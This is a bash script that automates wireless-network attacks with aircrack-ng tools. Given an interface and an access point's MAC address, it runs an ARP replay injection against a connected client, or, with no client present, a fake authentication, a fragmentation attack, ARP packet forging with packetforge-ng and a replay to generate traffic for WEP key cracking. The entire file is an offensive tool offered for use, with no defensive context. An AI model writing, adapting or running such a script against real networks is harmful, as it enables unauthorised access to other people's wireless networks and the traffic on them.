#!/bin/bash 

function usage {
	echo "usage: `basename $0` -i iface [-c client] -a ap_mac"
}

function arp_replay_with_client {
	echo "AP: $ap_mac"
	echo "Client: $client_mac"
	echo "Interface: $iface"
	echo "* Attempting ARP replay"
	echo "-----------------------"
	aireplay-ng -3 -b $ap_mac -h $client_mac $iface
}

function arp_replay_no_client {
	# try a fake auth first
	echo "* Attempting a fake auth"
	echo "------------------------"
	aireplay-ng -1 0 -a $ap_mac -h $our_mac $iface

	if [[ $? -ne 0 ]]; then 
		echo "! Fake auth failed."
		exit 1
	fi

	# perform a fragment attack
	echo "* Perform a fragment attack"
	echo "---------------------------"
	echo "y" | aireplay-ng -5 -h $our_mac -b $ap_mac $iface 

	if [[ $? -ne 0 ]]; then
		echo "! Fragment attack failed."
		exit 1
	fi

	# get the generated xor file
	xor_file=`ls -latr *.xor | awk '{print $NF}'`

	# create our arp packet
	echo "* Creating ARP packet"
	echo "---------------------"
	packetforge-ng -0 -a $ap_mac -h $our_mac -k 255.255.255.255 -l 255.255.255.255 -y $xor_file -w my.arp.request

	echo
	echo "* Replaying ARP packet"
	echo "----------------------"
	echo "y" | aireplay-ng -2 -h $our_mac -r my.arp.request $iface 
}


# global variables
ap_mac=""
iface=""
client_mac=""

if [[ `whoami` != "root" ]]; then
	echo "Must be root to run `basename $0`"
	exit 1
fi

if [[ -z $1 ]]; then
	usage
	exit 1
fi

while getopts "i:c:a:" OPT; do 
	case $OPT in
		i) iface=$OPTARG;;
		a) ap_mac=$OPTARG;;
		c) client_mac=$OPTARG;;
		*) usage; exit;;
	esac
done

if [[ -z $ap_mac || -z $iface ]]; then 
	usage
	exit 1
fi

our_mac=`macchanger -s $iface | grep Current | awk '{print $3}'`


if [[ ! -z $client_mac ]]; then
	# use ARP replay on an associated client
	arp_replay_with_client
else
	# ARP replay without an associated client
	arp_replay_no_client
fi
